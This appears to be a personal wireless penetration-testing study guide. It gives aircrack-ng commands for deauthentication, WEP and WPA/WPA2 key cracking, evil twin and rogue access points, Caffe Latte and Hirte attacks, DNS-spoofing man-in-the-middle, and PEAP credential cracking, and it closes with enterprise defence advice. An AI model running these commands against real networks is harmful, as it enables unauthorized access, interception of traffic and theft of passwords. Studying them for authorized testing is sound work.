# Wireless Pentest

# Hardware requirements

- Wifi adapter that supports monitor mode thanks to its chipset and supports both 2.4 and 5 GHz (but you can stand with 2.4 GHz)

# Set up wireless card

Plug the card, open a terminal and type

```python
iwconfig
```

It is named ‘wlan0’ in my case, I’m sure now that it’s detected and put in managed mode

You should see that it’s ‘UP’ in the second line of the output by typing 

```python
ifconfig wlan0
```

Else you can bring it UP using

```python
ifconfig wlan0 up
```

# Connect to access point

## Open Authentication

Let’s see networks in our vicinity and filter only interesting lines

```python
iwlist wlan0 scanning | grep 'Cell\|Quality\|ESSID\|IEEE'
```

Once you find the wanted network, type this to connect

```python
iwconfig wlan0 essid "Galaxy"
```

Then type this to check the status and the ESSID you are connected to

```python
iwconfig wlan0
```

To find the router’s IP address 

```python
route -n
```

To assign a specific IP to the wireless card

```python
ifconfig wlan0 192.168.0.2 netmask 255.255.255.0 up
```

Then check the status by typing

```python
ifconfig wlan0
```

And pinging the router 

```python
ping 192.168.0.1
```

And verifying that responses are coming from the access point

```python
arp -a
```

## WEP

To connect through hexadecimal format of password

```python
iwconfig wlan0 essid WLAN_NAME key WLAN_PASSWORD
```

To connect through ASCII format of password

```python
iwconfig wlan0 essid WLAN_NAME key s:WLAN_PASSWORD
```

For checking connection status and setting up wireless card, steps still the same

## WPA

To connect run and keep it running to stay connected

```python
wpa_supplicant -Dwext -iwlan0 -c wpa_supp.conf
```

Here is the wpa_supp.conf file:

```python
network={
        ssid="Galaxy"
        key_mgmt=WPA-PSK
        proto=WPA
        pairwise=TKIP
        group=TKIP
        psk="galaxyca"
}
```

## WPA2

The same as WPA except the wpa_supp.conf file configuration:

```python
network={
        ssid="Galaxy"
        key_mgmt=WPA-PSK
        proto=WPA2
        pairwise=CCMP
        group=CCMP
        psk="galaxyca"
}
```

Once you are connected to either WEP or WPA, use the following to grab an IP address

```python
dhclient wlan0
```

# WLAN

WLAN frames contain a Frame Control block that contains a Type block and defines the WLAN packet type

![Untitled](Wireless%20Pentest%2063e9e0cb40d54a0099ac64d6c0d3da57/Untitled.png)

The Type field defines the type of WLAN frame, which has three possibilities:

1. Management frames: Management frames are responsible for maintaining
communication between the access points and wireless clients. The Management
frames can have the following sub-types:
    - Authentication
    - De-authentication
    - Association Request
    - Association Response
    - Reassociation Request
    - Reassociation Response
    - Disassociation
    - Beacon
    - Probe Request
    - Probe Response
2. Control frames: Control frames are responsible for ensuring a proper exchange of
data between the access point and wireless clients. Control frames can have the
following sub-types:
    - Request to Send (RTS)
    - Clear to Send (CTS)
    - Acknowledgement (ACK)
3. Data frames: Data frames carry the actual data sent on the wireless network. There
are no sub-types for data frames.

## Rename interfaces

Check the current name of network interface

```python
ip link show
```

To rename network interface

```python
ip link set eth0 name eth123
```

Then bring eth123 up

```python
ip link set eth123 up
```

# Sniffing wireless packets

Put the interface to monitor mode

```python
airmon-ng start wlan0
```

It’s new name is wlan0mon, check it 

```python
iwconfig or airmon-ng
```

 It is possible to create multiple monitor mode interfaces using the same physical card if it supports this using the above airmon-ng command, you may have to rename interfaces to avoid confusion.

Launch Wireshark and select wlan0mon interface to listen through it and use filters to find information you want.

You have to be in the same channel as the access point to sniff traffic through this network

To find the AP’s channel

```python
 airodump-ng --bssid 00:21:91:D2:8E:25 wlan0mon
```

You can filter airodump-ng output using bssid that you can get from

```python
airodump-ng wlan0mon
```

Or from

```python
iwlist wlan0 scanning
```

To put the interface in a specific channel

```python
iwconfig wlan0mon channel 6
```

To verify this type 

```python
iwconfig wlan0mon
```

You won’t see the channel but you will see the corresponding Frequency

**2.4GHz WiFi Channel to frequency chart**

| **WLAN/wifi channel number** | **Lower frequency(MHz)** | **center frequency(MHz)** | **Upper frequency(MHz)** |
| --- | --- | --- | --- |
| channel-1 | 2401 | 2412 | 2423 |
| channel-2 | 2404 | 2417 | 2428 |
| channel-3 | 2411 | 2422 | 2433 |
| channel-4 | 2416 | 2427 | 2438 |
| WLAN channel-5 | 2421 | 2432 | 2443 |
| channel-6 | 2426 | 2437 | 2448 |
| channel-7 | 2431 | 2442 | 2453 |
| channel-8 | 2436 | 2447 | 2458 |
| channel-9 | 2441 | 2452 | 2463 |
| WLAN channel-10 | 2451 | 2457 | 2468 |
| channel-11 | 2451 | 2462 | 2473 |
| channel-12 | 2456 | 2467 | 2478 |
| channel-13 | 2461 | 2472 | 2483 |
| channel-14 | 2473 | 2484 | 2495 |

## Wireshark Filters

Management frames

```python
wlan.fc.type == 0
```

You can see frame type under IEEE 802.11 > Frame control

Control frames 

```python
wlan.fc.type == 1
```

Data frames 

```python
wlan.fc.type == 2
```

To select a subtype like beacon frames among management frames

```python
 (wlan.fc.type == 0) && (wlan.fc.subtype == 8)
```

Additionally you can select any of the headers fields and set it as filter or use one of the filters available in the top settings of Wireshark

To select a specific access point

```python
wlan.bssid == 00:21:91:D2:8E:25
```

To select data packets through this access point

```python
(wlan.bssid == 00:21:91:d2:8e:25) && (wlan.fc.type_subtype == 0x20)
```

More filters can be found here:
[Wireshark Display Filters - WiFi (wifi-professionals.com)](https://www.wifi-professionals.com/2019/03/wireshark-display-filters)

## Packet injection

To test packets injection type

```python
aireplay-ng -9 -e Galaxy -a 00:21:91:d2:8e:25 wlan0mon
```

To inject and not just test you can use this flag ‘**`-x nbpps`**’ where nbpps is number of packets per second instead of ‘-9’

You can see packets injected by applying this filter to Wireshark

```python
 (wlan.bssid == 00:21:91:d2:8e:25) && !(wlan.fc.type_subtype == 0x08)
```

Remember to be in the same channel as the AP just like the FM radio. A wireless card can be on one channel at a time.

# Regulatory domains in wireless

To show kernel logs

```python
dmesg -w
```

To show the default enabled frequencies

```python
iw list | grep MHz
```

To change the regulatory domain

```python
iw reg set US 
```

US for USA, FR for France, UK etc

You can do the same for other properties like power

```python
iwconfig wlan0 txpower 27 
```

 27dBm (500 milliwatts)

# Uncovering hidden SSIDs

You can use the passive technique of waiting for a legitimate client to connect the access point. This will generate Probe Request and Probe Response packets which will contain the SSID of the network. Or the active technique in which you gonna Deauthenticate the client to put him to reconnect.

So just launch Wireshark and filter by the AP’s bssid and select non-Beacon packets

```python
 (wlan.bssid == 00:21:91:d2:8e:25) && !(wlan.fc.type_subtype == 0x08)
```

To launch Deauthentication attack

```python
aireplay-ng -0 5 -a 00:21:91:D2:8E:25 wlan0mon
```

**Beacons:** Broadcasted by APs at regular intervals. Contain information about the network, including the SSID (network name), supported data rates, security settings, and more.

**Probe requests:** sent by client devices actively looking for networks. Devices send probe requests to nearby APs, hoping to find a familiar network they’ve connected to before. 

**Probe responses:** When an AP receives a probe request frame, it responds with a probe response frame. The probe response contains information about the network, including: SSID (network name), Supported data rates, Encryption types (if required), Other 802.11 capabilities of the AP.

# MAC filtering

If there’s a MAC filtering enabled in the AP pick one of the connected clients and use it too

To show connected clients MAC addresses

```python
airodump-ng  -c 11 -a --bssid 00:21:91:D2:8E:25 wlan0mon
```

Then spoof your MAC

```python
macchanger –m 60:FB:42:D5:E4:01
```

# Bypassing WEP

## Shared Key Authentication (SKA)

![Untitled](Wireless%20Pentest%2063e9e0cb40d54a0099ac64d6c0d3da57/Untitled%201.png)

To sniff packets between the AP and clients and store store packets in a files with prefix galaxykeystream

```python
 airodump-ng wlan0mon -c 11 --bssid 00:21:91:D2:8E:25 -w galaxykeystream
```

An indication that the capture has succeeded is when the AUTH column reads SKA

You can either wait for a legitimate client to connect to the access point or force
a reconnect using the Deauthentication technique.

To fake the shared key authentication using a random MAC address aa:aa:aa:aa:aa:aa

```python
 aireplay-ng -1 0 -e Galaxy -y galaxykeystream-01-00-21-91-D2-8E-25.xor -a 00:21:91:D2:8E:25 -h aa:aa:aa:aa:aa:aa wlan0mon
```

aireplay-ng lets us know if the authentication succeeded or not in the output

After authentication succeeds, the tool fakes an association with the access point that you can see in Wireshark using the filter

```python
wlan.addr == aa:aa:aa:aa:aa:aa
```

 Access points have a maximum client count after which they start refusing connections.

### Crack WEP (SKA) still need fake auth case

To capture traffic between the AP and clients

```python
 airodump-ng wlan0mon -c 11 --bssid 00:21:91:D2:8E:25 -w galaxykeystream
```

You need a large number of Data packets, encrypted with the same key to exploit weaknesses in the
protocol.

You will capture ARP packets on the wireless network using aireplay-ng and inject them back into the network, to simulate ARP responses.

```python
aireplay-ng -3 -b 00:21:91:D2:8E:25 -h 60:A1:23:98:B5:73
```

-3 stands for ARP replay

-h stands for authenticated client’s MAC address that you are spoofing

Data packets gonna increase too much

To crack the WEP key

```python
aircrack-ng galaxykeytransfer-01.cap
```

And let the cracking work

You can launch the airodump-ng to collect the WEP packets, aireplay-ng to replay attack and aircrack-ng to crack the WEP key all at the same time to save time.

Data packets required to crack the key is non-deterministic, but generally in the order of a hundred thousand or more.

WEP is totally flawed and any WEP key (no matter how complex) will be cracked by Aircrack-ng

# Bypassing WPA/WPA2

WPA (or WPA v1 as it is referred to sometimes) primarily uses the TKIP encryption algorithm. TKIP was aimed at improving WEP, without requiring completely new hardware to run it.
WPA2 in contrast mandatorily uses the AES-CCMP algorithm for encryption, which is much more powerful and robust than TKIP.
Both WPA and WPA2 allow for either EAP-based authentication, using Radius servers (Enterprise) or a Pre-Shared Key (PSK) (Personal)-based authentication schema.

WPA/WPA2 PSK is vulnerable to a dictionary attack. The inputs required for this attack are the four-way WPA handshake between client and access point, and a wordlist containing common passphrases. Then, using tools like Aircrack-ng, we can try to crack the WPA/WPA2 PSK passphrase.

![Untitled](Wireless%20Pentest%2063e9e0cb40d54a0099ac64d6c0d3da57/Untitled%202.png)

![Untitled](Wireless%20Pentest%2063e9e0cb40d54a0099ac64d6c0d3da57/Untitled%203.png)

The way WPA/WPA2 PSK works is that, it derives the per-sessions key called Pairwise
Transient Key (PTK), using the Pre-Shared Key and five other parameters—SSID of Network,
Authenticator Nounce (ANounce), Supplicant Nounce (SNounce), Authenticator MAC
address (Access Point MAC), and Suppliant MAC address (Wi-Fi Client MAC). This key is
then used to encrypt all data between the access point and client.
An attacker who is eavesdropping on this entire conversation, by sniffing the air can get all
the five parameters mentioned in the previous paragraph. The only thing he does not have
is the Pre-Shared Key. So how is the Pre-Shared Key created? It is derived by using the WPA
PSK passphrase supplied by the user, along with the SSID. The combination of both of these
are sent through the Password Based Key Derivation Function (PBKDF2), which outputs the
256-bit shared key.

In a typical WPA/WPA2 PSK dictionary attack, the attacker would use a large dictionary of
possible passphrases with the attack tool. The tool would derive the 256-bit Pre-Shared Key
from each of the passphrases and use it with the other parameters, described aforesaid to
create the PTK. The PTK will be used to verify the Message Integrity Check (MIC) in one of
the handshake packets. If it matches, then the guessed passphrase from the dictionary was
correct, otherwise it was incorrect. Eventually, if the authorized network passphrase exists in
the dictionary, it will be identified. This is exactly how WPA/WPA2 PSK cracking works!

## Cracking WPA-PSK still have to check other attacks and tools

To capture and store the packets of the target network

```python
 airodump-ng –bssid 00:21:91:D2:8E:25 –channel 11 –write WPACrackingDemo wlan0mon
```

To capture the four-way WPA handshake by forcing a client to reconnect

```python
aireplay-ng --deauth 1 -a 00:21:91:D2:8E:25 wlan0mon
```

airodump-ng will indicate ‘WPA Handshake:’ followed by the AP MAC address on the top-right corner of the screen once it’s captured

You can stop airodump-ng now 

The handshake packets are the ones whose protocol is EAPOL Key as seen when you open the .cap file using Wireshark 

It is important to note that in WPA cracking, you are just as good as your dictionary.

To crack the password

```python
aircrack-ng WPACrackingDemo-01.cap -w path/to/wordlist
```

If the passphrase is not present in the dictionary, the attack will fail!

### Optimization

One of the more CPU and time-consuming calculations is that of the Pre-Shared Key using
the PSK passphrase and the SSID through the PBKDF2. This function hashes the combination
of both over 4,096 times before outputting the 256 bit Pre-Shared Key.

We can speed this up by pre-calculating the Pre-Shared Key, also called the Pairwise Master
Key (PMK) in the 802.11 standard parlance. It is important to note that, as the SSID is also
used to calculate the PMK, with the same passphrase but a different SSID, we would end up
with a different PMK. Thus, the PMK depends on both the passphrase and the SSID.

To create a file PMK-Galaxy that contains the pre-generated PMK for a given SSID ‘Galaxy’ and wordlist

```python
genpmk -f path/to/wordlist -d PMK-Galaxy -s "Galaxy" 
```

You can now use Cowpatty to crack the password

```python
cowpatty -d PMK-Galaxy -s "Galaxy" -r WPACrackingDemo-01.cap
```

In this case, pre-calculating the PMK keys reduced the cracking time from 22 minutes using aircrack-ng to approximately 7 seconds using cowpatty 

Aircrack-ng does support directly the use of PMK keys so you need this if you want to use aircrack-ng instead of cowpatty

```python
 airolib-ng PMK-Aircrack --import cowpatty PMK-Galaxy
```

Then you can launch aircrack-ng 

```python
 aircrack-ng –r PMK-Aircrack WPACrackingDemo2-01.cap
```

Pyrit that can leverage multi-CPU systems to speed up cracking

```python
pyrit -r WPACrackingDemo2-01.cap -i PMK-Galaxy attack_cowpatty
```

attack_cowpatty at the end tells Pyrit to use cowpatty method (based on PMK)

Pyrit took 3 seconds :)

Pyrit can also pre-compute PMKs

```python
pyrit -i path/to/wordlist -o PMK-Galaxy create_essid "Galaxy"
```

### The same techniques work for WPA2 PSK

# Decrypting WEP and WPA

## Encryption principles

### WEP (Wired Equivalent Privacy)

- **Encryption Algorithm**: WEP uses the RC4 stream cipher for encryption.
- **Key Length**: WEP supports 40-bit (also known as WEP-64) and 104-bit (WEP-128) encryption keys, which are concatenated with a 24-bit Initialization Vector (IV) to create a 64-bit or 128-bit RC4 key.

### WPA

- **Encryption Algorithm**: WPA primarily uses TKIP (Temporal Key Integrity Protocol).
- **Key Management**: WPA includes dynamic key management with the introduction of the 4-Way Handshake and Group Key Handshake.

### WPA2

- **Encryption Algorithm**: WPA2 uses AES (Advanced Encryption Standard) with CCMP (Counter Mode with Cipher Block Chaining Message Authentication Code Protocol) for encryption.
- **Key Management**: Similar to WPA, WPA2 uses the 4-Way Handshake and Group Key Handshake for dynamic key management.

### WPA3

- **Encryption Algorithm**: WPA3 uses AES-GCM (Galois/Counter Mode) for encryption, providing both confidentiality and integrity of the transmitted data.
- **Key Management**: WPA3 employs Simultaneous Authentication of Equals (SAE) for authentication, ensuring robust protection against offline dictionary attacks and providing forward secrecy.

## WEP

To decrypt packets from WEP capture file

```python
airdecap-ng -w galaxyca test-01.cap
```

The decypted files are stored in a file named test-01-dec.cap. 

-w is the password 

You can use the tshark utility to view the first ten packets in the file.

```python
tshark -r test-01-dec.cap -c 10
```

## WPA/WPA2

To decrypt WPA/WPA2 packets 

```python
airdecap-ng -p galaxyca test-01.cap -e "Galaxy"
```

-p stands for the password

While Wireshark is excellent for analyzing network traffic, it relies on decrypted packets.

# DoS

WLANs are prone to Denial of Service (DoS) attacks using various techniques, including but not limited to:

- De-Authentication attack
- Dis-Association attack
- CTS-RTS attack
- Signal interference or spectrum jamming attack

You can launch the De-Authentication attack by sending a Broadcast De-Authentication packet on
behalf of the access point to the entire wireless network or a specific connected client.

# Evil Twin have to be pushed to the end by hijacking the router’s admin portal and getting the password

First of all pick the AP that you want to emulate 

```python
airodump-ng wlan0mon 
```

Then create a fake AP with the same ESSID 

```python
airbase-ng -a AA:AA:AA:AA:AA:AA --essid "Galaxy" -c 11 wlan0mon
```

You can even use the AP’s MAC address, but airodump-ng won’t be able to differentiate between the original and fake AP 

To see your made fake AP, open another terminal and type

```python
airodump-ng --channel 11 wlan0
```

To get a client, you have to kick him off from the original AP

```python
aireplay-ng --deauth 0 -a 00:21:B3:A5:43:76 wlan0mon
```

Wait for the client till he connects to the fake AP

Fake AP’s signal strength matters, but clients also consider other attributes:

- **Channel**: Clients prefer the AP on the same channel.
- **Authentication**: WPA-PSK, WPA2-PSK, etc.

# Rogue AP

A Rogue access point is an unauthorized access point connected to the authorized network.
Typically, this access point can be used as a backdoor entry by an attacker, thus enabling him
to bypass all security controls on the network.

## Wireless Rogue in a wired network

To create the Rogue AP

```python
airbase-ng --essid Rogue -c 11 wlan0mon
```

The created fake AP is open authentication but you can set any other type of encryption on it

To create a bridge between the Ethernet Interface which a part of the authorized network and our Rogue access point interface

```python
brctl addbr wifi-bridge
```

To add both the Ethernet and the at0 virtual interface created by airbase-ng to this bridge

```python
brctl addif wifi-bridge eth0
```

```python
brctl addif wifi-bridge at0
```

You have to  ****bring with these interfaces up to bring the bridge up

```python
ifconfig eth0 0.0.0.0 up
```

```python
ifconfig at0 0.0.0.0 up
```

You have to enable IP forwarding in the kernel as root to ensure packets are forwarded

```python
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Any authenticated client to this Rogue AP receives an IP address from the DHCP daemon running on the authorized LAN

You can now connect to the Rogue AP and ping the router in the wired LAN  

# Honeypots

Normally, when a wireless client such as a laptop is turned on, it will probe for the networks
it has previously connected to. 

Honeypot attacks, which happen due to Mis-Association to the hacker's access point thinking it is the legitimate one.

You can see the previously connected to networks under Probes column when running airodump-ng

You can see the Probe requests if you launch Wireshark on wlan0mon and set the filter

```python
 wlan.fc.type_subtype == 0x04 && wlan.sa == 60:FB:42:D5:E4:01
```

 Create a fake access point in the same channel as the original one using airbase-ng

De-authenticate the client of the legitimate AP using aireplay-ng

Assuming the signal strength of our fake access point is stronger than the legitimate one to the client, check if the client is connected to the fake AP from airodump-ng 

# Caffe Latte attack

The Caffe Latte attack is a WEP attack which allows a hacker to retrieve the WEP key of the authorized network, using just the client. The attack does not require the client to be anywhere close to the authorized WEP network. It can crack the WEP key using just the isolated client.

Once you find a client (not associated) in the airodump-ng output under the bssid column

Bring up a fake AP similar the WEP AP in the probes list of the client (Probes in airodmup-ng output)

```python
airbase-ng -c 3 -a 00:21:54:C3:B2:45 -e "Galaxy" -L -W 1 wlan0mon
```

-a sets the fake AP’s MAC

-L enables caffe latte

-W sets the WEP flag in beacon frames to 1 (enable)

Once a client connects to this fake AP, collect packets using airodump-ng from this AP and fire up aircrack-ng to crack the password just like WEP cracking method 

Once you have enough WEP encrypted packets, aircrack-ng succeeds in cracking the key

# Hirte attack in what way is it different form caffe latte cause it seems identical

The Hirte attack extends the Caffe Latte attack using fragmentation techniques and allows for almost any packet to be used.

Set up an honeypot AP and select Hirte 

```python
airbase-ng -c 3 -a 00:21:54:C3:B2:45 -e "Galaxy" -N -W 1 wlan0mon
```

-N enables Hirte 

To capture packets and store the packets in a .cap file 

```python
airodump-ng -c 3 --bssid 00:21:54:C3:B2:45 --write Hirte wlan0mon
```

Once the client connects to your made AP airbase-ng starts the Hirte attack

You have to launch aircrack-ng to start cracking the key

# AP-less WPA cracking

In order to crack WPA-PSK, we will bring up a WPA-PSK Honeypot and when the client
connects to us, only Message 1 and Message 2 will come through. As we do not know the
passphrase, we cannot send Message 3. However, Message 1 and Message 2 contain all the
information required to begin the key cracking process.

Set up a honeypot AP 

```python
airbase-ng -c 11 -a 00:21:54:C3:B2:45 -e Galaxy -W 1 -z 2 wlan0mon
```

-z 2 flag creates a WPA-PSK which uses TKIP

Launch airodump-ng to capture packets form this AP

```python
airodump-ng -c 11 --bssid 00:21:54:C3:B2:45 --write AP-less-WPAcracking wlan0mon
```

When a client connects to your made AP, it starts the handshake capture but fails after Message 2 of the 4-way hanshake but airodump-ng reports that a handhsake has been captured.

You only need information included in the first two packets

Start aircrack-ng and give it the captured .cap file captured and a good wordlist  

# MITM

## MITM between wireless and wired same as rogue I guess

By creating a fake access point and bridging it with your Ethernet interface, you ensure that
any wireless client connecting to the fake access point would perceive that it is connected
to the Internet via the wired LAN.

You gonna follow the same Rogue AP creation steps :

To create an AP

```python
airbase-ng --essid mitm -c 11 wlan0mon
```

airbase-ng creates an interface ‘at0’. Think of this as the wired-side interface of our software-based AP ‘mitm’.

To create a bridge on the hacker laptop, consisting of the wired (eth0) and wireless interface (at0)

```python
brctl addbr mitm-bridge
brctl addif mitm-bridge eth0
brctl addif mitm-bridge at0
ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
```

To assign an IP address to the bridge interface with the command

```python
ifconfig mitm-bridge 192.168.0.199 up
```

You can also use DHCP instead of ‘ifconfig’

Check connectivity with the gateway

```python
ping 192.168.0.1
```

```python
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Once a wireless client connects to our access point mitm. It would automatically
get an IP address over DHCP (server running on the wired-side gateway).

 By starting Wireshark and sniffing on the at0 interface you can see all the traffic as it is passing through you from the wireless to the wired

## MITM between two wireless can be automated using bettercap or ettercap or mitmf (outdated) or airgeddon

## Eavesdropping

When routing traffic you can use Wireshark turned on on ‘at0’ (for the wireless to wired example) to monitor all traffic and reveal password hashes that use HTTP   

## Session Hijacking using DNS,

There other methods, such as using Beef to steal cookies through JavaScript injection 

Personalize the web page to look similar to the original one

Once the victim types ‘google.com’ that you can see in Wireshark by filtering by dns requests

To send fake DNS responses which will resolve the IP address of "google.com" to the attacker machine's IP address

```python
dnsspoof -i mitm-bridge
```

As soon as the victim makes a DNS request for any host (including [google.com](http://google.com/)), Dnsspoof replies back

Launch a web server to show up when the victim requests 

```python
systemctl start apache2
```

## Enumerating wireless security profiles

We will assume that the wireless client has a network ‘Galaxy’configured on it and it actively sends Probe Requests for this network, when it is not connected to any access point. In order to find the security configuration of this network, we will need to create multiple access points. For our discussion, we will assume that the client profile is either an open network, WEP protected, WPA-PSK or WPA2-PSK.
This would mean we would have to create four access points. To do this we will first create four virtual interfaces wlan0mon to wlan3mon using the airmon-ng start wlan0 command multiple times :

To see created interfaces 

```python
ifconfig -a 
```

To  create the Open AP on wlan0mon

```python
airbase-ng --essid "Galaxy" -a AA:AA:AA:AA:AA:AA -c 3 wlan0mon 
```

To create the WEP-protected AP on wlan1mon

```python
airbase-ng --essid "Galaxy" -a BB:BB:BB:BB:BB:BB -c 3 -W 1 wlan1mon 
```

 To create WPA-PSK AP on wlan2mon

```python
airbase-ng --essid "Galaxy" -a CC:CC:CC:CC:CC:CC -c 3 -W 1 -z 2 wlan2mon 
```

 To create WPA2-PSK AP on wlan3mon

```python
airbase-ng --essid "Galaxy" -a DD:DD:DD:DD:DD:DD -c 3 -W 1 -Z 2 wlan3mon 
```

Using ‘airodump-ng’ you can ensure that all the APs created are up and running

Now you just have to wait for the client to connect to the corresponding security configuration AP.

If the client is already connected to another AP, use Deauth to push him to send probe requests to you.

# WPA-Entreprise and Radius

The most widely used open source Radius server is FreeRadius. However, setting it up needs much configuration.

Some common tasks include defining clients and users, setting up authentication methods, and integrating with databases like MySQL or LDAP4. 

All the FreeRadius configuration files are under /usr/local/etc/raddb directory

Open clients.conf. This is where you define the allowed list of clients that can connect to your RADIUS server

The “**Backtrack 5 Wireless Penetration Testing Beginner's Guide: Master Bleeding Edge Wireless Testing Techniques With Backtrack 5**” detailed it very well and used a patched version called FreeRadius by Joshua Wright.

To start the Radius server

```python
radiusd -s -X
```

## Cracking PEAP

Protected Extensible Authentication Protocol (PEAP) is the most popular version of EAP in use. This is the EAP mechanism shipped natively with Windows.
PEAP has two versions:

1. PEAPv0 with EAP-MSCHAPv2 (most popular as this has native support on Windows)
2. PEAPv1 with EAP-GTC

PEAP uses server-side certificates for validation of the Radius server. Almost all attacks on PEAP leverage mis-configurations in certificate validation

 Open eap.conf under raddb directory file to ensure that PEAP is enabled

To monitor  the log file created by FreeRadius

```python
tail /usr/local/var/log/radius/freeradius-server-wpe.log -n 0 -f
```

Windows has native support for PEAP. Let's ensure that Certificate Verification has been turned of

You just need to connect to the access point Wireless Lab for Windows to start PEAP authentication

Once the client connects to the access point, the client is prompted for a Username / Password. 

As soon as the client do this, you are able to see the MSCHAP-v2 challenge response appear in the log file

To crack the password using a wordlist 

```python
asleap -C b0:43:a2:23:f5:76 -R a2:23:f5:76:b0:43:a2:a2:23:f5:43:a2:25:d5:76:a2:23:f5:76:b0:43:a2:a2:23 -W wordlist.txt
```

Where -C defines the challenge and -R defines the response. Can be copied from the log file output

PEAP can be mis-configured in multiple ways. Even with certificate validation enabled, if the
administrator does not mention the authentic servers in Connect to these servers list, the attacker can obtain a real certificate for another domain from any of the listed certifying authorities. This would still be accepted by the client.

## Cracking EAP-TTLS seems like PEAP

In EAP-Tunneled Transport Layer Security (EAP-TTLS), the server authenticates itself with
certificate. The client can optionally use certificate as well. Unfortunately, this does not have
native support on Windows, but does on MacOS, and we need to use third party utilities.

Make sure that EAP-TTLS is enabled in eap.conf and start Radius server then monitor the log file

Immediately, when a client on Mac connects to the AP using the username and password the MSCHAP-v2 challenge / response appears in the log file

You again have to use Asleap to crack the password using a wordlist

## Security best practices for Enterprises

We have seen a ton of attacks against WPA/WPA2, both Personal and Enterprise. Based on
our experience, we would recommend the following:
1. For SOHOs and medium-sized businesses, use WPA2-PSK with a strong passphrase. You have up to 63 characters at your disposal. Make use of it.
2. For large enterprises, use WPA2-Enterprise with EAP-TLS. This uses both client and server-side certificates for authentication, and currently is unbreakable.
3. If you have to use PEAP or EAP-TTLS with WPA2-Enterprise, then ensure that certificate validation is turned on, the right certifying authorities are chosen, the Radius servers that are authorized are used and finally any setting that allows users to accept new Radius servers, certificates, or certifying authorities is turned off.

**Achraf Lamchahar**
